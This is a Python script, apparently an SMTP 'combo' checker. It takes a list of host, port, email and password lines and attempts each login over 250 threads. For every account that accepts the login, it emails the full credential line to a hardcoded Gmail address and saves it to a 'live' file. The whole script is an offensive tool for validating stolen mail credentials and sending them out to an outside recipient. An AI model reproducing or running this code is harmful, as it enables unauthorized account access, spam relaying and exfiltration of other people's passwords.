import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from hashlib import *
import sys
import os
from multiprocessing.pool import ThreadPool

combo = sys.argv[1]

Done = 0
Failed = 0


def SEND(SMTP):
    global Done, Failed
    try:
        host, port, email, pas = SMTP.split('|')
        port = int(port)
        subject = 'SMTPTESTED'
        main = SMTP
        Reciver = 'im.hanzou@gmail.com'

        msg = MIMEMultipart('alternative')
        msg["From"] = 'BETO'
        msg["Subject"] = subject
        msg["To"] = Reciver
        myText = msg.attach(MIMEText(str(main), 'html'))

        server = smtplib.SMTP(host, port)
        server.ehlo()
        server.starttls()
        server.login(email, pas)
        server.sendmail(email, Reciver, msg.as_string())
        Done += 1
        print('[+] Done: [{}]').format(SMTP)
        os.system("title " + "[+] MultiSenderTester .. [Done : {}] [Failed : {}]".format(Done, Failed))
        open('SMTPLIVECHK.txt', 'a').write('\n'+ SMTP)
    except:
        Failed += 1
        print('[+] Failed: [{}]').format(SMTP)
        os.system("title " + "[+] MultiSenderTester .. [Done : {}] [Failed : {}]".format(Done, Failed))
        pass


if __name__ == '__main__':
    combo = open(combo, 'r').read().split('\n')
    pool = ThreadPool(250)
    for _ in pool.imap_unordered(SEND, combo):
        pass
